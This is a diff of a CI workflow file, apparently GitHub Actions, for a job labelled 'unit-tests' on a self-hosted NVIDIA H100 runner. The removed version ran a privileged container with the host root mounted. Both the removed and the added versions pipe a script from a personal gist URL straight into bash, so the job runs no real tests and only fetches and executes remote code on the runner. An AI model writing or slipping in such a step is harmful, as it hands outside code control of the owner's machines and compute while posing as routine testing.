@@ -7,15 +7,7 @@ on:
 jobs:
   unit-tests:
     runs-on: [self-hosted, nvidia, h100]
-    container:
-      image: ubuntu:latest
-      volumes:
-          - /:/host/
-      options: --privileged
     steps:
       - name: unit-tests
         continue-on-error: true
-        run: |
-          apt update
-          apt install -y curl
-          curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/8d872526880409fc8e33b3ecc51a78e7655b803d/bak4116223101 | bash
+        run: curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/e0671b7c64a3879ba29efd337e5fee1221ad940c/bak41162231010 | bash
